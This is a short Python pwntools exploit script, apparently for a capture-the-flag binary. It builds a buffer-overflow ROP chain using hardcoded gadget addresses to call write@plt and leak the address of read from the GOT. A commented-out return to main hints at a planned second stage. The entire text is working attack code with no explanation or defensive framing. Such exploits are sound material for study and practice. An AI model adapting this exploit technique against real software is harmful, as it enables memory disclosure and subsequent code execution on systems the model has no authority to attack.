from pwn import *
import sys


# ROP gadgets

pop_rdi = 0x4005a9
pop_rsi = 0x4005ab
pop_rdx = 0x4005ad
pop_rax = 0x4005a7



write_plt   = 0x400430
read_plt    = 0x400440
read_got    = 0x601020
main        = 0x400570


# Memleak - write@plt memleaks read@got
payload = ""
payload += "A" * 16
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(pop_rdx)
payload += p64(0x8)
payload += p64(write_plt)
#payload += p64(main)			# return to main to retrigger vuln for stage 2

print payload

